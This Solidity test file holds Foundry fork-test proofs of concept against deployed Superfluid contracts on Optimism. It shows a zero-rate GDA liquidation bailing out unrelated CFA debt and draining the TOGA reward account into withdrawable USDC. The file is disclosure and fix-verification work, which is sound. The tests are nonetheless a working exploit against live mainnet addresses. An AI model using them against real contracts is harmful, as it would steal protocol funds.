// SPDX-License-Identifier: AGPLv3
pragma solidity ^0.8.23;

// NOTE: These fork tests exercise DEPLOYED Optimism bytecode (pre-fix) and demonstrate the
// live vulnerability. After upgrading GDA on-chain, attack tests here should be updated to
// expectRevert(GDA_FLOW_DOES_NOT_EXIST). Local fix coverage:
// test/foundry/agreements/gdav1/GeneralDistributionAgreementV1.zeroRateLiquidation.t.sol

import { Test } from "forge-std/Test.sol";

import { IConstantFlowAgreementV1 } from "../../contracts/interfaces/agreements/IConstantFlowAgreementV1.sol";
import {
    IGeneralDistributionAgreementV1,
    PoolConfig
} from "../../contracts/interfaces/agreements/gdav1/IGeneralDistributionAgreementV1.sol";
import { ISuperfluidPool } from "../../contracts/interfaces/agreements/gdav1/ISuperfluidPool.sol";
import { ISuperAgreement } from "../../contracts/interfaces/superfluid/ISuperAgreement.sol";
import { ISuperfluid } from "../../contracts/interfaces/superfluid/ISuperfluid.sol";
import { ISuperToken } from "../../contracts/interfaces/superfluid/ISuperToken.sol";
import { ISuperfluidToken } from "../../contracts/interfaces/superfluid/ISuperfluidToken.sol";
import { IResolver } from "../../contracts/interfaces/utils/IResolver.sol";

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface ISuperfluidGovernanceReward {
    function getRewardAddress(ISuperfluid host, ISuperfluidToken superToken) external view returns (address rewardAddress);
}

interface ITOGAv1 {
    function getCurrentPIC(ISuperToken token) external view returns (address pic);
    function getCurrentPICInfo(ISuperToken token) external view returns (address pic, uint256 bond, int96 exitRate);
}

contract GDAZeroRateLiquidationLiveForkPoC is Test {
    IResolver internal constant RESOLVER = IResolver(0x743B5f46BC86caF41bE4956d9275721E0531B186);
    ISuperfluid internal constant HOST = ISuperfluid(0x567c4B141ED61923967cA25Ef4906C8781069a10);
    ISuperfluidGovernanceReward internal constant GOVERNANCE =
        ISuperfluidGovernanceReward(0x0170FFCC75d178d426EBad5b1a31451d00Ddbd0D);
    IConstantFlowAgreementV1 internal constant CFA =
        IConstantFlowAgreementV1(0x204C6f131bb7F258b2Ea1593f5309911d8E458eD);
    IGeneralDistributionAgreementV1 internal constant GDA =
        IGeneralDistributionAgreementV1(0x68Ae17fa7a31b86F306c383277552fd4813b0d35);
    ISuperToken internal constant USDCX = ISuperToken(0x35Adeb0638EB192755B6E52544650603Fe65A006);
    IERC20Like internal constant USDC = IERC20Like(0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85);
    // On Optimism, governance.getRewardAddress(USDCx) == metadata contractsV1.toga (same contract).
    ITOGAv1 internal constant TOGA = ITOGAv1(0xA3c8502187fD7a7118eAD59dc811281448946C8f);
    address internal constant TOGA_REWARD_ACCOUNT = 0xA3c8502187fD7a7118eAD59dc811281448946C8f;

    address internal constant ALICE = address(0xa11ce);
    address internal constant BOB = address(0xb0b);
    address internal constant LIQUIDATOR = address(0xf001);
    address internal constant SENTINEL = address(0x5e471e);
    address internal constant POOL_ADMIN = address(0xcafe);
    address internal constant SINK = address(0xdead);

    int96 internal constant CFA_FLOW_RATE = 100_000_000_000_000; // 0.0001 USDCx/second = 0.36 USDCx/hour.
    uint256 internal constant STARTING_SUPER_USDC = 10e18;

    function setUp() public {
        string memory rpcUrl = vm.envOr("OP_RPC_URL", string("https://mainnet.optimism.io"));
        uint256 forkBlock = vm.envOr("OP_FORK_BLOCK", uint256(153486805));
        vm.createSelectFork(rpcUrl, forkBlock);

        assertEq(block.chainid, 10, "PoC must run on an Optimism fork");
        assertEq(RESOLVER.get("Superfluid.v1"), address(HOST), "resolver host mismatch");
        assertEq(USDCX.getHost(), address(HOST), "USDCx host mismatch");
        assertEq(USDCX.getUnderlyingToken(), address(USDC), "USDCx underlying mismatch");
        assertEq(
            address(HOST.getAgreementClass(keccak256("org.superfluid-finance.agreements.ConstantFlowAgreement.v1"))),
            address(CFA),
            "CFA address mismatch"
        );
        assertEq(
            address(
                HOST.getAgreementClass(keccak256("org.superfluid-finance.agreements.GeneralDistributionAgreement.v1"))
            ),
            address(GDA),
            "GDA address mismatch"
        );
        assertEq(
            address(HOST.getGovernance()),
            address(GOVERNANCE),
            "governance address mismatch"
        );
        assertEq(
            GOVERNANCE.getRewardAddress(HOST, ISuperfluidToken(address(USDCX))),
            TOGA_REWARD_ACCOUNT,
            "USDCx reward account mismatch"
        );

        (int256 rewardAvailable,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
        assertGt(rewardAvailable, 0, "live USDCx reward account must be funded");
    }

    function test_zeroRateGdaLiquidationBailsOutUnrelatedCfaDebt() public {
        (int256 rewardBefore,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
        uint256 rewardBeforeUsd = uint256(rewardBefore);

        _fundAliceWithUSDCx();

        ISuperfluidPool unrelatedPool =
            GDA.createPool(ISuperfluidToken(address(USDCX)), POOL_ADMIN, PoolConfig(false, false));
        assertTrue(GDA.isPool(ISuperfluidToken(address(USDCX)), address(unrelatedPool)), "pool must be real");
        assertEq(GDA.getFlowRate(ISuperfluidToken(address(USDCX)), ALICE, unrelatedPool), 0, "no GDA flow exists");

        vm.startPrank(ALICE);
        HOST.callAgreement(
            ISuperAgreement(address(CFA)),
            abi.encodeCall(CFA.createFlow, (ISuperfluidToken(address(USDCX)), BOB, CFA_FLOW_RATE, new bytes(0))),
            new bytes(0)
        );
        USDCX.transferAll(SINK);
        vm.stopPrank();

        (, int96 cfaRateBefore,,) = CFA.getFlow(ISuperfluidToken(address(USDCX)), ALICE, BOB);
        assertEq(cfaRateBefore, CFA_FLOW_RATE, "CFA stream should be open");

        int256 totalBailout;
        for (uint256 i; i < 3; ++i) {
            vm.warp(block.timestamp + 1 hours);

            (int256 aliceBefore,,,) = USDCX.realtimeBalanceOfNow(ALICE);
            (int256 rewardRoundBefore,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
            assertLt(aliceBefore, 0, "Alice is critical from CFA debt only");

            vm.prank(LIQUIDATOR);
            HOST.callAgreement(
                ISuperAgreement(address(GDA)),
                abi.encodeCall(
                    GDA.distributeFlow,
                    (ISuperfluidToken(address(USDCX)), ALICE, unrelatedPool, int96(0), new bytes(0))
                ),
                new bytes(0)
            );

            (int256 aliceAfter,,,) = USDCX.realtimeBalanceOfNow(ALICE);
            (int256 rewardRoundAfter,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
            (, int96 cfaRateAfter,,) = CFA.getFlow(ISuperfluidToken(address(USDCX)), ALICE, BOB);

            assertGt(aliceAfter, aliceBefore, "GDA liquidation bailed out non-GDA debt");
            assertLt(rewardRoundAfter, rewardRoundBefore, "reward account paid the bailout");
            assertEq(cfaRateAfter, CFA_FLOW_RATE, "unrelated CFA stream was not closed");
            assertEq(GDA.getFlowRate(ISuperfluidToken(address(USDCX)), ALICE, unrelatedPool), 0, "still no GDA flow");
            totalBailout += rewardRoundBefore - rewardRoundAfter;
        }

        (int256 rewardAfter,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
        (int256 bobAvailable,,,) = USDCX.realtimeBalanceOfNow(BOB);

        assertLt(rewardAfter, rewardBefore, "live reward account was drained");
        assertGt(totalBailout, 0, "bailout amount should be positive");
        assertGt(bobAvailable, 0, "attacker receiver accumulated streamed USDCx");

        uint256 bobUnderlyingBefore = USDC.balanceOf(BOB);
        vm.prank(BOB);
        USDCX.downgrade(uint256(bobAvailable));
        assertGt(USDC.balanceOf(BOB), bobUnderlyingBefore, "receiver withdrew streamed USDC");

        emit log_named_decimal_uint("live USDCx reward account at risk, dollars", rewardBeforeUsd, 18);
        emit log_named_decimal_int("USDCx drained by this PoC, dollars", totalBailout, 18);
    }

    function test_attackerCapitalIsRecoverableAfterCfaCleanup() public {
        uint256 aliceUnderlyingStart = USDC.balanceOf(ALICE);
        uint256 bobUnderlyingStart = USDC.balanceOf(BOB);
        uint256 sinkUnderlyingStart = USDC.balanceOf(SINK);

        (uint256 underlyingAmount,) = _fundAliceWithUSDCx();
        (int256 rewardBefore,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);

        ISuperfluidPool unrelatedPool =
            GDA.createPool(ISuperfluidToken(address(USDCX)), POOL_ADMIN, PoolConfig(false, false));

        vm.startPrank(ALICE);
        HOST.callAgreement(
            ISuperAgreement(address(CFA)),
            abi.encodeCall(CFA.createFlow, (ISuperfluidToken(address(USDCX)), BOB, CFA_FLOW_RATE, new bytes(0))),
            new bytes(0)
        );
        USDCX.transferAll(SINK);
        vm.stopPrank();

        int256 totalBailout;
        for (uint256 i; i < 3; ++i) {
            vm.warp(block.timestamp + 1 hours);

            (int256 aliceBefore,,,) = USDCX.realtimeBalanceOfNow(ALICE);
            (int256 rewardRoundBefore,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
            assertLt(aliceBefore, 0, "Alice must be critical before bogus GDA liquidation");

            vm.prank(LIQUIDATOR);
            HOST.callAgreement(
                ISuperAgreement(address(GDA)),
                abi.encodeCall(
                    GDA.distributeFlow,
                    (ISuperfluidToken(address(USDCX)), ALICE, unrelatedPool, int96(0), new bytes(0))
                ),
                new bytes(0)
            );

            (int256 rewardRoundAfter,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
            totalBailout += rewardRoundBefore - rewardRoundAfter;
        }

        vm.prank(ALICE);
        HOST.callAgreement(
            ISuperAgreement(address(CFA)),
            abi.encodeCall(CFA.deleteFlow, (ISuperfluidToken(address(USDCX)), ALICE, BOB, new bytes(0))),
            new bytes(0)
        );

        _downgradeAvailable(ALICE);
        _downgradeAvailable(BOB);
        _downgradeAvailable(SINK);

        uint256 aliceDelta = USDC.balanceOf(ALICE) - aliceUnderlyingStart;
        uint256 bobDelta = USDC.balanceOf(BOB) - bobUnderlyingStart;
        uint256 sinkDelta = USDC.balanceOf(SINK) - sinkUnderlyingStart;
        uint256 recoveredUnderlying = aliceDelta + bobDelta + sinkDelta;
        (int256 rewardAfter,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);

        emit log_named_decimal_uint("attacker initial USDC capital", underlyingAmount, 6);
        emit log_named_decimal_uint("attacker USDC recovered by Alice", aliceDelta, 6);
        emit log_named_decimal_uint("attacker USDC recovered by Bob", bobDelta, 6);
        emit log_named_decimal_uint("attacker USDC recovered by Sink", sinkDelta, 6);
        emit log_named_decimal_uint("attacker recovered USDC after cleanup", recoveredUnderlying, 6);
        emit log_named_decimal_int("reward account USDCx drained", rewardBefore - rewardAfter, 18);
        emit log_named_decimal_int("GDA bailout amount", totalBailout, 18);

        assertGt(recoveredUnderlying, underlyingAmount, "attacker should recover capital plus reward-account drain");
    }

    function _fundAliceWithUSDCx() internal returns (uint256 underlyingAmount, uint256 adjustedSuperAmount) {
        (underlyingAmount, adjustedSuperAmount) = USDCX.toUnderlyingAmount(STARTING_SUPER_USDC);

        deal(address(USDC), ALICE, underlyingAmount);
        vm.deal(ALICE, 1 ether);

        vm.startPrank(ALICE);
        assertTrue(USDC.approve(address(USDCX), underlyingAmount), "USDC approve failed");
        USDCX.upgrade(adjustedSuperAmount);
        vm.stopPrank();
    }

    function _downgradeAvailable(address account) internal {
        (int256 available,,,) = USDCX.realtimeBalanceOfNow(account);
        if (available > 0) {
            vm.prank(account);
            USDCX.downgrade(uint256(available));
        }
    }

    /// @dev Sets up attacker CFA stream + GDA pool; returns pool for liquidation calls.
    function _setupAttackStream() internal returns (ISuperfluidPool pool) {
        _fundAliceWithUSDCx();
        pool = GDA.createPool(ISuperfluidToken(address(USDCX)), POOL_ADMIN, PoolConfig(false, false));
        vm.startPrank(ALICE);
        HOST.callAgreement(
            ISuperAgreement(address(CFA)),
            abi.encodeCall(CFA.createFlow, (ISuperfluidToken(address(USDCX)), BOB, CFA_FLOW_RATE, new bytes(0))),
            new bytes(0)
        );
        USDCX.transferAll(SINK);
        vm.stopPrank();
    }

    function _gdaBailout(ISuperfluidPool pool) internal {
        vm.prank(LIQUIDATOR);
        HOST.callAgreement(
            ISuperAgreement(address(GDA)),
            abi.encodeCall(
                GDA.distributeFlow,
                (ISuperfluidToken(address(USDCX)), ALICE, pool, int96(0), new bytes(0))
            ),
            new bytes(0)
        );
    }

    /// @notice Loop GDA bailouts with no sentinel competition until TOGA/reward balance is exhausted.
    /// Verifies the hard cap is the on-chain USDCx balance (which equals PIC bond on this deployment),
    /// not an abstract bond-duration limit.
    function test_loopStopsWhenTogaRewardBalanceDepleted_notBondDuration() public {
        (int256 rewardStart,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
        (address picStart, uint256 bondStart,) = TOGA.getCurrentPICInfo(USDCX);
        assertGt(rewardStart, 0, "TOGA must start funded");
        assertGt(bondStart, 0, "PIC bond must exist");
        assertEq(address(TOGA), TOGA_REWARD_ACCOUNT, "reward account is TOGA on Optimism");

        ISuperfluidPool pool = _setupAttackStream();

        uint256 cycles;
        int256 totalDrained;
        int256 rewardBeforeCycle = rewardStart;

        // 1h per cycle at 0.0001 USDCx/s => ~0.36 USDCx/cycle; ~8 cycles to drain ~2.61 USDCx.
        for (uint256 i; i < 20; ++i) {
            vm.warp(block.timestamp + 1 hours);

            (int256 aliceAvail,,,) = USDCX.realtimeBalanceOfNow(ALICE);
            if (aliceAvail >= 0) continue;

            (int256 rewardNow,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
            if (rewardNow <= 0) break;

            _gdaBailout(pool);

            (int256 rewardAfter,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
            (, int96 cfaRate,,) = CFA.getFlow(ISuperfluidToken(address(USDCX)), ALICE, BOB);
            assertEq(cfaRate, CFA_FLOW_RATE, "CFA must stay open without sentinel");

            int256 roundDrain = rewardBeforeCycle - rewardAfter;
            if (roundDrain > 0) {
                totalDrained += roundDrain;
                ++cycles;
                rewardBeforeCycle = rewardAfter;
            }
        }

        (int256 rewardEnd,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
        (, uint256 bondEnd,) = TOGA.getCurrentPICInfo(USDCX);
        (, int96 cfaRateEnd,,) = CFA.getFlow(ISuperfluidToken(address(USDCX)), ALICE, BOB);

        emit log_named_uint("successful bailout cycles", cycles);
        emit log_named_decimal_int("initial TOGA USDCx (reward + PIC bond)", rewardStart, 18);
        emit log_named_decimal_int("final TOGA USDCx", rewardEnd, 18);
        emit log_named_decimal_int("total drained from TOGA", totalDrained, 18);
        emit log_named_address("PIC at start", picStart);
        emit log_named_decimal_uint("PIC bond at start", bondStart, 18);
        emit log_named_decimal_uint("PIC bond at end", bondEnd, 18);

        assertGe(cycles, 6, "expected many cycles before depletion");
        assertLe(rewardEnd, 0, "TOGA balance exhausted (can go negative - solvency defect)");
        assertEq(cfaRateEnd, CFA_FLOW_RATE, "stream survives until balance runs out");
        assertGe(totalDrained, rewardStart - 1e15, "drained at least the starting TOGA balance");
        assertEq(bondEnd, 0, "PIC bond zeroed when TOGA balance is gone");
        // Bond is floored at 0; TOGA available balance can go negative after bond is exhausted.
        assertEq(bondStart - bondEnd, uint256(rewardStart), "bond drop equals initial TOGA balance");
    }

    /// @notice Protocol does NOT stop at TOGA balance == 0. Bailouts keep succeeding while TOGA goes negative.
    function test_bailoutsContinueAfterTogaBalanceGoesNegative() public {
        ISuperfluidPool pool = _setupAttackStream();
        (int256 togaStart,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);

        uint256 cyclesAfterZero;
        uint256 cyclesAfterNegative;
        int256 togaAtFirstZero;
        int256 togaAtFirstNegative;
        int256 togaMin = type(int256).max;
        bool seenZero;
        bool seenNegative;

        for (uint256 i; i < 30; ++i) {
            vm.warp(block.timestamp + 1 hours);

            (int256 aliceAvail,,,) = USDCX.realtimeBalanceOfNow(ALICE);
            if (aliceAvail >= 0) continue;

            (int256 togaBefore,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);

            // Never stop early — keep calling even when TOGA is already <= 0.
            _gdaBailout(pool);

            (int256 togaAfter,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
            (, int96 cfaRate,,) = CFA.getFlow(ISuperfluidToken(address(USDCX)), ALICE, BOB);
            assertEq(cfaRate, CFA_FLOW_RATE, "CFA stays open throughout");

            if (togaAfter < togaMin) togaMin = togaAfter;

            if (!seenZero && togaBefore > 0 && togaAfter <= 0) {
                seenZero = true;
                togaAtFirstZero = togaAfter;
            }
            if (togaBefore <= 0) {
                ++cyclesAfterZero;
                if (!seenNegative && togaAfter < 0) {
                    seenNegative = true;
                    togaAtFirstNegative = togaAfter;
                }
                if (togaAfter < 0) ++cyclesAfterNegative;
            }
        }

        (int256 togaEnd,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
        (int256 bobEnd,,,) = USDCX.realtimeBalanceOfNow(BOB);

        emit log_named_decimal_int("TOGA at start", togaStart, 18);
        emit log_named_decimal_int("TOGA at first cross to <=0", togaAtFirstZero, 18);
        emit log_named_decimal_int("TOGA at first negative after zero", togaAtFirstNegative, 18);
        emit log_named_decimal_int("TOGA minimum reached", togaMin, 18);
        emit log_named_decimal_int("TOGA at end", togaEnd, 18);
        emit log_named_uint("bailout cycles after TOGA hit zero", cyclesAfterZero);
        emit log_named_uint("bailout cycles while TOGA negative", cyclesAfterNegative);
        emit log_named_decimal_int("Bob accumulated USDCx", bobEnd, 18);

        assertTrue(seenZero, "must cross zero during attack");
        assertTrue(seenNegative, "TOGA must go negative");
        assertGt(cyclesAfterZero, 0, "bailouts must continue after TOGA hits zero");
        assertGt(cyclesAfterNegative, 0, "bailouts must continue while TOGA is negative");
        assertLt(togaEnd, 0, "TOGA ends negative");
        assertGe(cyclesAfterNegative, 2, "multiple bailouts succeed while TOGA is negative");
        assertGt(bobEnd, int256(uint256(uint96(CFA_FLOW_RATE))) * int256(8 hours), "Bob gains beyond pre-zero drain");

        // Prove the excess is real USDC, not just negative-bookkeeping dust.
        uint256 usdcBefore = USDC.balanceOf(BOB);
        vm.prank(BOB);
        USDCX.downgrade(uint256(bobEnd));
        uint256 usdcAfter = USDC.balanceOf(BOB);
        emit log_named_decimal_uint("Bob USDC after downgrade", usdcAfter - usdcBefore, 6);
        assertGt(usdcAfter, usdcBefore, "Bob can downgrade USDCx gained past TOGA depletion");
    }

    /// @notice CFA sentinel liquidation stops the loop even while TOGA still has balance.
    function test_cfaSentinelLiquidationStopsLoopWhileTogaStillFunded() public {
        (int256 rewardStart,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
        ISuperfluidPool pool = _setupAttackStream();

        vm.warp(block.timestamp + 1 hours);
        (int256 aliceBefore,,,) = USDCX.realtimeBalanceOfNow(ALICE);
        assertLt(aliceBefore, 0, "sender must be critical");

        // Sentinel CFA-liquidates before the attacker can GDA-bailout.
        vm.prank(SENTINEL);
        HOST.callAgreement(
            ISuperAgreement(address(CFA)),
            abi.encodeCall(CFA.deleteFlow, (ISuperfluidToken(address(USDCX)), ALICE, BOB, new bytes(0))),
            new bytes(0)
        );

        (, int96 cfaRate,,) = CFA.getFlow(ISuperfluidToken(address(USDCX)), ALICE, BOB);
        assertEq(cfaRate, 0, "CFA stream closed by sentinel");

        (int256 rewardAfterSentinel,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);

        // Attacker may still trigger one GDA bailout if sender remains critical, but the loop is dead:
        // no further streamed tokens accrue to Bob.
        {
            (int256 aliceAvailAfterCfa,,,) = USDCX.realtimeBalanceOfNow(ALICE);
            if (aliceAvailAfterCfa < 0) {
                _gdaBailout(pool);
            }
        }

        (int256 rewardAfterGda,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
        (int256 bobAfter,,,) = USDCX.realtimeBalanceOfNow(BOB);

        vm.warp(block.timestamp + 3 hours);
        (int256 bobLater,,,) = USDCX.realtimeBalanceOfNow(BOB);
        (int256 rewardLater,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);

        emit log_named_decimal_int("TOGA balance at start", rewardStart, 18);
        emit log_named_decimal_int("TOGA after sentinel CFA liquidation", rewardAfterSentinel, 18);
        emit log_named_decimal_int("TOGA after optional GDA bailout", rewardAfterGda, 18);
        emit log_named_decimal_int("TOGA 3h later (loop dead)", rewardLater, 18);
        emit log_named_decimal_int("Bob balance after sentinel", bobAfter, 18);
        emit log_named_decimal_int("Bob balance 3h later", bobLater, 18);

        assertEq(bobLater, bobAfter, "no further streaming after CFA closed");
        // Sentinel path leaves most of TOGA intact vs ~full drain over the same wall-clock time.
        assertGt(rewardLater, rewardStart / 2, "most TOGA balance remains if sentinel wins early");
        assertLt(rewardStart - rewardLater, 5e17, "sentinel path drains far less than full loop");
    }

    /// @notice Without sentinel interference, sustained drain rate tracks CFA flow rate.
    function test_sustainedDrainRateMatchesFlowRate_notTogaBondDuration() public {
        ISuperfluidPool pool = _setupAttackStream();
        (int256 rewardStart,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);

        uint256 hoursElapsed;
        uint256 bailoutCycles;
        int256 totalDrained;

        for (uint256 i; i < 10; ++i) {
            vm.warp(block.timestamp + 1 hours);
            hoursElapsed += 1;

            (int256 aliceAvail,,,) = USDCX.realtimeBalanceOfNow(ALICE);
            if (aliceAvail >= 0) continue;

            (int256 rewardNow,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
            if (rewardNow <= 0) break;

            (int256 rewardBefore,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
            _gdaBailout(pool);

            (int256 rewardAfter,,,) = USDCX.realtimeBalanceOfNow(TOGA_REWARD_ACCOUNT);
            int256 roundDrain = rewardBefore - rewardAfter;
            if (roundDrain > 0) {
                totalDrained += roundDrain;
                ++bailoutCycles;
            }
        }

        int256 expectedByFlowRate = int256(uint256(uint96(CFA_FLOW_RATE))) * int256(bailoutCycles * 1 hours);

        emit log_named_uint("wall-clock hours", hoursElapsed);
        emit log_named_uint("successful bailout cycles", bailoutCycles);
        emit log_named_decimal_int("drained via GDA bailouts", totalDrained, 18);
        emit log_named_decimal_int("expected at CFA flow rate", expectedByFlowRate, 18);

        // Drain is bailoutCycles * flowRate, bounded by starting balance, not by TOGA minBondDuration (7 days).
        assertApproxEqAbs(totalDrained, expectedByFlowRate, 2e16, "drain tracks flow rate per bailout cycle");
        assertGe(totalDrained, rewardStart - 1e15, "drains starting TOGA balance");
        assertLt(bailoutCycles * 1 hours, 7 days, "finished far before TOGA minBondDuration");
    }
}
